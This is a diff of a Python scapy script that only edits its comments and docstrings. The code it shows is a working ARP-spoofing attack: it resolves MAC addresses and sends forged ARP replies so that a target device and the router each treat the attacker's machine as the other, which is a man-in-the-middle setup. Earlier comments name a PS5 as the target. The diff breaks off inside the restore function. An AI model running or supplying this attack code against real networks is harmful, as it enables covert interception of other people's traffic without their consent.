@@ -1,25 +1,24 @@
 import scapy.all as scapy
 
 def get_device_info(ip):
-    """Retrieve hardware address for the target IP."""
+    """Retrieves the MAC address for a given IP."""
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_req = scapy.ARP(pdst=ip)
     ans = scapy.srp(broadcast/arp_req, timeout=2, verbose=False)[0]
     return (ans[0][1].hwsrc, "Known") if ans else (None, None)
 
 def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
-    """Sends spoofed ARP packets with explicit Ethernet destinations."""
-    # Tell PS5 that your Arch machine is the Router
+    """Sends spoofed ARP packets with explicit Layer 2 headers."""
+    # Tell Target I am the Router
     t_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-    # Tell Router that your Arch machine is the PS5
+    # Tell Router I am the Target
     g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
     
-    # Send at Layer 2 to silence warnings
     scapy.sendp(t_pkt, verbose=False)
     scapy.sendp(g_pkt, verbose=False)
 
 def restore(dest_ip, src_ip):
-    """Re-maps the correct MAC addresses to stop the interception."""
+    """Heals the network by sending correct ARP mappings."""
     d_mac, _ = get_device_info(dest_ip)
     s_mac, _ = get_device_info(src_ip)
     if d_mac and s_mac:
